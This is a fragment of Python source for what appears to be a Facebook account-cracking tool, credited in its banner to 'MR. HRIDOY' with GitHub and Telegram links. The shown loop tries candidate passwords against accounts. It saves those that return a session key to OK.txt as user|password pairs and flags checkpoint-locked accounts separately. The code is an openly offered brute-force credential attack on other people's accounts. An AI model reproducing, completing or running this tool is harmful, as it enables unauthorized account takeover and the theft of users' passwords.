...
def banner():
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : %sMR. HRIDOY                   %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/mrogggy   %s║"%(Z,B,Z))
	print("%s║%s  Telegram : https://t.me/ogggy69         %s║"%(Z,B,Z))
	print("%s║%s  Version  : %s1.0       [FREE]             %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	xox('            %s》%s》%s》%sHRIDOY CRACK %s《%s《%s《'%(M,H,B,H,B,H,M))
	print("")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [HRI46Y-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [HRI46Y-CP] '+user+'|'+pw+'\033[0;97m')
